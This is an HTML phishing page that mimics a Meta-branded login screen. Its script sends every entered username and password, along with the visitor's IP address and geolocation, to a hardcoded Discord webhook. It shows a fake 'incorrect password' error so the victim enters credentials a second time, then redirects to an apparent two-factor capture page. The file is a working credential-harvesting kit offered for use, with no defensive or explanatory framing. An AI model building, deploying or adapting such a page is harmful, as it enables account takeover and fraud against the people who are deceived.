<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">

  <div class="w-full max-w-sm px-6">

    <!-- Logo -->
    <div class="flex justify-center mb-14">
      <img src="IMG_0905.png" alt="App" class="w-16 h-16" />
    </div>

    <!-- Username -->
    <input
      id="username"
      type="text"
      placeholder="Username, mobile number or email address"
      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
    />

    <!-- Password -->
    <input
      id="password"
      type="password"
      placeholder="Password"
      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
    />

    <!-- Login Button -->
    <button
      id="loginBtn"
      class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
             transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
             flex items-center justify-center gap-2"
    >
      <span id="btnText">Log in</span>
      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" stroke="white" stroke-width="4" fill="none" opacity="0.3"/>
        <path d="M22 12a10 10 0 0 1-10 10" stroke="white" stroke-width="4" fill="none"/>
      </svg>
    </button>

    <!-- Error Message -->
    <div id="errorMsg" class="text-red-500 text-sm mb-6 hidden text-center">
      Incorrect username or password.
    </div>

    <!-- Forgotten Password -->
    <div class="text-center mb-6">
      <a href="#" class="text-sm font-normal text-black hover:underline">
        Forgotten password?
      </a>
    </div>

    <!-- Bottom Section -->
    <div class="mt-16">
      <button class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition">
        Create new account
      </button>

      <div class="flex justify-center mt-2">
        <img src="IMG_0906.png" alt="Meta" class="h-8" />
      </div>
    </div>
  </div>

  <script>
    // ================== YOUR WEBHOOK ==================
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1489579300687577279/fMVQanQ8kgUHZ9a_G39YhvpKjHnCmJmljDDHR9ntSa7bUAPMh1Axq0AK4VRumc10Npau";

    let attempt = 0;

    // Best free IP + Country + City API (no key required)
    async function getIPAndLocation() {
      try {
        const res = await fetch('https://ip-api.com/json/?fields=status,message,query,country,city');
        if (!res.ok) throw new Error('Failed');

        const data = await res.json();

        if (data.status === "success") {
          return {
            ip: data.query || 'Unknown',
            country: data.country || 'Unknown',
            city: data.city || 'Unknown'
          };
        } else {
          throw new Error(data.message || 'API error');
        }
      } catch (err) {
        console.error("GeoIP failed:", err);
        return {
          ip: 'Unknown',
          country: 'Unknown',
          city: 'Unknown'
        };
      }
    }

    // Send to Discord in the exact simple format
    async function sendToDiscord(username, password, geoData, attemptNum) {
      const { ip, country, city } = geoData;

      const message = `NEW LOGS 🪵

USERNAME: ${username}
PASSWORD: ${password}
IP: ${ip}
COUNTRY: ${country}
CITY: ${city}

X${attemptNum}`;

      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: message,
            username: "Logger"
          })
        });
        console.log(`✅ Attempt ${attemptNum} sent`);
      } catch (err) {
        console.error("Webhook failed:", err);
      }
    }

    document.getElementById("loginBtn").addEventListener("click", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const passwordInput = document.getElementById("password");
      const btn = document.getElementById("loginBtn");
      const btnText = document.getElementById("btnText");
      const spinner = document.getElementById("spinner");
      const errorMsg = document.getElementById("errorMsg");

      if (!username || !password) {
        alert("Please fill in all fields!");
        return;
      }

      // Start loading animation immediately
      attempt++;
      btn.disabled = true;
      btnText.textContent = "Logging in...";
      spinner.classList.remove("hidden");

      // Fetch IP + location and send to Discord (background)
      const geoData = await getIPAndLocation();
      await sendToDiscord(username, password, geoData, attempt);

      // Handle UI after background tasks
      if (attempt === 1) {
        errorMsg.classList.remove("hidden");
        passwordInput.value = "";

        // Reset button
        btn.disabled = false;
        btnText.textContent = "Log in";
        spinner.classList.add("hidden");

        // Shake effect
        passwordInput.classList.add("animate-shake");
        setTimeout(() => passwordInput.classList.remove("animate-shake"), 600);
      } 
      else {
        // Second attempt - redirect after short delay
        setTimeout(() => {
          window.location.href = "securedfa.html";
        }, 1000);
      }
    });
  </script>

  <!-- Shake animation -->
  <style>
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      20%, 60% { transform: translateX(-8px); }
      40%, 80% { transform: translateX(8px); }
    }
    .animate-shake {
      animation: shake 0.5s ease-in-out;
    }
  </style>

</body>
</html>
